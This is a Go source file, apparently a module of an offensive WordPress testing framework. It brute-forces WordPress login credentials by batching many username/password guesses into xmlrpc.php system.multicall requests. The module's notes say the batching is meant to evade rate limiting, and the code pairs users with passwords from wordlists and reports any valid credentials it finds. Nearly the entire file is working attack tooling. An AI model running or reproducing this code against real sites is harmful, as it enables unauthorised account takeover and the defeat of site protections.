// Package access contains authentication pathway modules.
package access

import (
	"context"
	"fmt"
	"strings"

	"github.com/lab/wpforge/internal/engine"
	"github.com/lab/wpforge/internal/module"
	"github.com/lab/wpforge/internal/registry"
	"github.com/lab/wpforge/internal/wordlist"
)

func init() { registry.Register(XMLRPCMulticallBrute{}) }

// XMLRPCMulticallBrute brute-forces credentials via xmlrpc.php
// system.multicall, batching many wp.getUsersBlogs attempts per request.
type XMLRPCMulticallBrute struct{}

func (XMLRPCMulticallBrute) Meta() module.Meta {
	return module.Meta{
		ID:         "access-xmlrpc-brute",
		Name:       "XML-RPC multicall brute force",
		Component:  "core (xmlrpc.php)",
		Primitive:  module.PrimitiveAccess,
		AuthLevel:  module.AuthNone,
		References: []string{"xmlrpc.php system.multicall"},
		Notes:      "Batches username/password guesses into multicall requests to evade rate limiting.",
	}
}

func (XMLRPCMulticallBrute) Params() []module.ParamSpec {
	return []module.ParamSpec{
		{Name: "userlist", Label: "Users (comma list, preset, URL, or file)", Default: "seclists:usernames-top100"},
		{Name: "passlist", Label: "Passwords (comma list, preset, URL, or file)", Default: "seclists:passwords-top500"},
		{Name: "batch", Label: "Multicall batch size", Default: "64"},
	}
}

// resolveList loads a list ref: inline CSV, SecLists preset, URL, or file.
func resolveList(ctx context.Context, ref, fallback string, log module.Logger) []string {
	if strings.Contains(ref, ",") && !strings.HasPrefix(ref, "seclists:") && !strings.HasPrefix(ref, "http") && !strings.Contains(ref, ".") {
		return splitCSV(ref)
	}
	items, err := wordlist.Load(ctx, ref, 0)
	if err != nil {
		log.Warnf("list %q failed (%v), using fallback", ref, err)
		return splitCSV(fallback)
	}
	if len(items) > 500 {
		log.Infof("list %q: %d entries (large - expect long runs)", ref, len(items))
	}
	return items
}

func (XMLRPCMulticallBrute) Run(ctx context.Context, t *module.Target, params map[string]string, log module.Logger) *module.Result {
	res := &module.Result{}
	users := resolveList(ctx, params["userlist"], "admin", log)
	passes := resolveList(ctx, params["passlist"], "admin,password,123456", log)
	batch := 64
	fmt.Sscanf(params["batch"], "%d", &batch)
	if batch < 1 {
		batch = 64
	}

	log.Infof("xmlrpc multicall brute: %d users x %d passwords, batch=%d", len(users), len(passes), batch)

	var pairs []engine.CredPair
	for _, u := range users {
		for _, p := range passes {
			pairs = append(pairs, engine.CredPair{User: u, Pass: p})
		}
	}

	total := len(pairs)
	for i := 0; i < total; i += batch {
		if ctx.Err() != nil {
			log.Warnf("aborted by user")
			return res
		}
		end := i + batch
		if end > total {
			end = total
		}
		chunk := pairs[i:end]
		if hit, ok := t.Client.XMLRPCMulticallLogin(ctx, chunk); ok {
			log.Successf("VALID CREDENTIALS: %s", hit)
			res.Success = true
			res.Summary = "credentials: " + hit
			parts := strings.SplitN(hit, ":", 2)
			res.Creds = &module.Credentials{Username: parts[0], Password: parts[1]}
			return res
		}
		log.Infof("batch %d/%d: no hit", (i/batch)+1, (total+batch-1)/batch)
	}

	log.Warnf("no valid credentials found")
	return res
}

func splitCSV(s string) []string {
	var out []string
	for _, f := range strings.Split(s, ",") {
		f = strings.TrimSpace(f)
		if f != "" {
			out = append(out, f)
		}
	}
	return out
}

var _ module.Module = XMLRPCMulticallBrute{}
